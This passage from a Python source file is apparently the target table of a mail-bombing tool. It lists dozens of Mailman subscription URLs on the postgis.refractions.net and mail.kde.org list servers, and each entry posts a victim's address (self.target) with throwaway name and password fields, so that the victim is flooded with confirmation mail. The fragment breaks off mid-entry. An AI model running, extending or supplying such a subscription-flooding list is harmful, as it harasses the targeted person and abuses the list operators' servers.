                'url': 'http://postgis.refractions.net/mailman/subscribe/pygeoapi',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pygeoapi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'liDij': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/pywps-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/pywps-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dHxHJ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-co',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-co',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BlPoy': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-community-team',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-community-team',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KYKPc': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-de',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-de',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nlKqv': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-developer',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-developer',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VKrVQ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-es',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-es',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GDioO': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-fr-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-fr-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UsDLM': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-it-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-it-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ssHYx': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-no-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-no-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HwgmG': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-pl',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-pl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tvENh': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-psc',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-psc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ruykA': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-pt',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-pt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZmkVM': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-qwc2',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-qwc2',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JbNqy': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-se-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-se-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UHbUb': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-sk',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-sk',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GHCQr': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-tr',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-tr',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jaYvv': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-trac',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-trac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IMnlO': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-uk-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-uk-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Vslda': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-us-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-us-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rsEOK': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GwvgS': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-voting-members',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-voting-members',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gwaGV': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/qgis-za-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/qgis-za-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'doCVo': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/quebec',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/quebec',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ltdnw': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/quebec-comite',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/quebec-comite',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NaxMq': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/quebec-conf',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/quebec-conf',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iStzh': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/rafagas',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/rafagas',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BsgjU': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/routergeocoder',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/routergeocoder',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nSXlI': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/sac',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/sac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FQnwG': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/scotland',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/scotland',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UTLSJ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/seasonofdocs',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/seasonofdocs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mpPjI': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/senegal',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/senegal',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'htzQx': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/sentinel-pds',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/sentinel-pds',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EfpYT': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/sevilla',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/sevilla',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TtTyl': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/shapelib',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/shapelib',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'angkw': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/soc',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/soc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hztuv': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/southeast-us',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/southeast-us',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Xfzov': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/spanish',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/spanish',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vSubM': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/spatial-ecology',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/spatial-ecology',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vUjHX': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/spatialreference.org',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/spatialreference.org',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'utnnk': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/srilanka',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/srilanka',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'voAGg': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/standards',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/standards',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kYaza': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/stdm-announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/stdm-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vYiWU': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/stdm-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/stdm-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kVrZX': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/stdm-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/stdm-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rDsKA': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/tcmug',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/tcmug',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GWnYN': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/tiff',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/tiff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JvLBW': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/tilecache',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/tilecache',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dliOE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/tiling',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/tiling',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QzSIi': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/tosprint',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/tosprint',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UqkRn': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/ubuntu',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/ubuntu',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UMRaY': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/uk',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/uk',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mRavH': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/un',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/un',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iFnVI': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/us',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/us',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NHcUr': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/utilities-telecom',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/utilities-telecom',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DURXE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/valencia',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/valencia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VGCLR': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/vector-tiles',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/vector-tiles',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qlVhP': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/vietnam',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/vietnam',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ftkBA': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/webcom',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/webcom',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OlDGa': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/webgl',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/webgl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ipbnL': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/webmap-discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/webmap-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zUQpQ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/wps-discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/wps-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rMQoZ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/www_international-discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/www_international-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GStxj': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/yukon',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/yukon',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WAEnX': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/zoo-discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/zoo-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zMvkl': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/zoo-psc',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/zoo-psc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gkIih': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/akademy-proposals',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/akademy-proposals',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OvqTK': {
                'url': 'https://mail.kde.org/mailman/subscribe/amarok',
                'token_url': 'https://mail.kde.org/mailman/listinfo/amarok',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DNBjy': {
                'url': 'https://mail.kde.org/mailman/subscribe/amarok-bugs-dist',
                'token_url': 'https://mail.kde.org/mailman/listinfo/amarok-bugs-dist',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'piMKk': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/bugsquad',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/bugsquad',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PzlvW': {
                'url': 'https://mail.kde.org/mailman/subscribe/calligra-author',
                'token_url': 'https://mail.kde.org/mailman/listinfo/calligra-author',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'smhkH': {
                'url': 'https://mail.kde.org/mailman/subscribe/calligra-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/calligra-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'acWGr': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/cantor-bugs',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/cantor-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XfRUN': {
                'url': 'https://mail.kde.org/mailman/subscribe/choqok-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/choqok-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uWXEG': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/cki-attendees',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/cki-attendees',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SYDpn': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/consulting',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/consulting',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MmPeA': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/cutehmi',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/cutehmi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tbItk': {
                'url': 'https://mail.kde.org/mailman/subscribe/digikam-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/digikam-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yyssf': {
                'url': 'https://mail.kde.org/mailman/subscribe/digikam-users',
                'token_url': 'https://mail.kde.org/mailman/listinfo/digikam-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SxYXl': {
                'url': 'https://mail.kde.org/mailman/subscribe/distributions',
                'token_url': 'https://mail.kde.org/mailman/listinfo/distributions',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bKNKX': {
                'url': 'https://mail.kde.org/mailman/subscribe/elisa',
                'token_url': 'https://mail.kde.org/mailman/listinfo/elisa',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Voymn': {
                'url': 'https://mail.kde.org/mailman/subscribe/enterprise',
                'token_url': 'https://mail.kde.org/mailman/listinfo/enterprise',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nzneB': {
                'url': 'https://mail.kde.org/mailman/subscribe/falkon',
                'token_url': 'https://mail.kde.org/mailman/listinfo/falkon',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NqMiD': {
                'url': 'https://mail.kde.org/mailman/subscribe/gcompris-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/gcompris-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mDPxC': {
                'url': 'https://mail.kde.org/mailman/subscribe/gcompris-espanol',
                'token_url': 'https://mail.kde.org/mailman/listinfo/gcompris-espanol',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hCjIa': {
                'url': 'https://mail.kde.org/mailman/subscribe/gcompris-france',
                'token_url': 'https://mail.kde.org/mailman/listinfo/gcompris-france',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PTyiw': {
